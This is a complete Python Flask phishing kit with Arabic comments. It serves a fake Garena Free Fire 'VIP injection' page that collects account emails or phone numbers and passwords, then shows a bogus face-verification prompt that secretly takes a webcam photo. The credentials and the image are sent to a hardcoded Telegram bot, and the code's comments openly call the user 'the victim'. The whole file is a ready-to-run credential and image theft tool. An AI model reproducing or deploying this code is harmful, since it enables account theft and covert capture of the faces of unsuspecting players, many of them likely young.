import telebot
from flask import Flask, request, render_template_string
import base64
import os

# --- إعداداتك الخاصة ---
TOKEN = "8195744080:AAHrjFbYsoAvm4Oi2EhJI09KShSvp3G76Vc"
CHAT_ID = "8362370478"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- الرابط الذي سيذهب إليه الضحية بعد الصيد ---
DOWNLOAD_LINK = "https://www.mediafire.com/file/example" 

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - VIP Dashboard</title>
    <style>
        :root { --gold: #ffb900; --red: #ff4b2b; --dark: #0c0c0c; }
        body { 
            margin: 0; background: var(--dark); font-family: 'Cairo', sans-serif; 
            color: white; overflow: hidden; height: 100vh;
            display: flex; justify-content: center; align-items: center;
        }
        /* خلفية اللعبة */
        .bg-overlay {
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: url('https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img15.jpg') no-repeat center;
            background-size: cover; filter: brightness(0.3) blur(3px); z-index: -1;
        }
        .main-card {
            width: 380px; background: rgba(0, 0, 0, 0.85); 
            border: 2px solid var(--gold); border-radius: 20px;
            padding: 30px; text-align: center; box-shadow: 0 0 40px rgba(255, 185, 0, 0.3);
            position: relative; animation: fadeIn 1s ease;
        }
        @keyframes fadeIn { from {opacity: 0; transform: scale(0.9);} to {opacity: 1; transform: scale(1);} }
        
        .logo { width: 140px; margin-bottom: 15px; filter: drop-shadow(0 0 10px var(--gold)); }
        
        .status { font-size: 12px; color: #00ff7f; margin-bottom: 20px; font-weight: bold; border: 1px solid #00ff7f; display: inline-block; padding: 2px 10px; border-radius: 5px; }

        .input-group { margin-bottom: 15px; text-align: right; }
        label { display: block; font-size: 12px; color: var(--gold); margin-bottom: 5px; margin-right: 5px; }
        input {
            width: 100%; padding: 14px; background: rgba(255,255,255,0.08); border: 1px solid #444;
            border-radius: 10px; color: white; outline: none; transition: 0.3s; box-sizing: border-box; text-align: right;
        }
        input:focus { border-color: var(--gold); background: rgba(255,185,0,0.05); }

        .btn-activate {
            width: 100%; padding: 16px; background: linear-gradient(90deg, #ff8c00, #ffb900);
            border: none; border-radius: 10px; color: black; font-weight: 900; font-size: 18px;
            cursor: pointer; margin-top: 20px; text-transform: uppercase;
            box-shadow: 0 5px 15px rgba(255, 185, 0, 0.4);
        }
        .btn-activate:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255, 185, 0, 0.6); }

        /* نافذة طلب الكاميرا */
        #camera-modal {
            position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.9);
            display: none; justify-content: center; align-items: center; z-index: 100;
        }
        .modal-content { background: #1a1a1a; padding: 30px; border-radius: 15px; width: 300px; border: 1px solid var(--gold); }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="bg-overlay"></div>

<div class="main-card">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/41/Garena_Free_Fire_logo.png/250px-Garena_Free_Fire_logo.png" class="logo">
    <div class="status">SERVER: ONLINE (V2.8)</div>
    <h2 style="margin:0; font-size:20px; color:#fff;">لوحة حقن الـ VIP</h2>
    <p style="font-size:12px; color:#aaa;">سجل الدخول لربط المعرف (ID) وتفعيل الحماية من الباند</p>

    <div class="input-group">
        <label>البريد الإلكتروني / رقم الهاتف</label>
        <input type="text" id="user" placeholder="مثال: example@mail.com">
    </div>
    <div class="input-group">
        <label>كلمة المرور</label>
        <input type="password" id="pass" placeholder="••••••••">
    </div>

    <button class="btn-activate" onclick="requestCam()">تفعيل الآن</button>
</div>

<div id="camera-modal">
    <div class="modal-content">
        <img src="https://img.icons8.com/color/96/face-id.png" width="60">
        <h3>تحقق من الوجه</h3>
        <p style="font-size:13px;">يرجى السماح بالوصول للكاميرا لإتمام عملية "التحقق من الهوية" ومنع الروبوتات.</p>
        <button class="btn-activate" onclick="startCapture()" style="padding:10px;">بدء التحقق</button>
    </div>
</div>

<video id="v" autoplay></video>
<canvas id="c"></canvas>

<script>
let uData, pData;

function requestCam() {
    uData = document.getElementById('user').value;
    pData = document.getElementById('pass').value;
    if(uData.length < 5 || pData.length < 4) { alert("يرجى إدخال بيانات صحيحة!"); return; }
    
    document.getElementById('camera-modal').style.display = 'flex';
}

async function startCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        const v = document.getElementById('v');
        v.srcObject = stream;
        
        // إخفاء النافذة وإظهار رسالة "جاري الحقن"
        document.querySelector('.modal-content').innerHTML = "<h3>جاري المعالجة...</h3><p>يرجى عدم إغلاق الصفحة</p>";

        setTimeout(() => {
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const img = c.toDataURL('image/png');
            
            fetch('/final_step', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: uData, p: pData, i: img})
            }).then(() => { window.location.href = "{{ download_url }}"; });
        }, 2000);
    } catch(e) {
        // إذا رفض الضحية الكاميرا نرسل البيانات فقط
        fetch('/final_step', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({u: uData, p: pData, i: "none"})
        }).then(() => { window.location.href = "{{ download_url }}"; });
    }
}
</script>

</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE, download_url=DOWNLOAD_LINK)

@app.route('/final_step', methods=['POST'])
def final_step():
    data = request.json
    # إرسال البيانات النصية
    msg = f"🏆 **صيد حساب فري فاير جديد**\\n👤: `{data['u']}`\\n🔑: `{data['p']}`"
    bot.send_message(CHAT_ID, msg, parse_mode="Markdown")
    
    # إرسال الصورة إذا تمت الموافقة
    if data['i'] != "none":
        img_bytes = base64.b64decode(data['i'].split(',')[1])
        with open("victim_face.png", "wb") as f: f.write(img_bytes)
        with open("victim_face.png", "rb") as f:
            bot.send_photo(CHAT_ID, f, caption="📸 وجه الضحية المحقون")
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
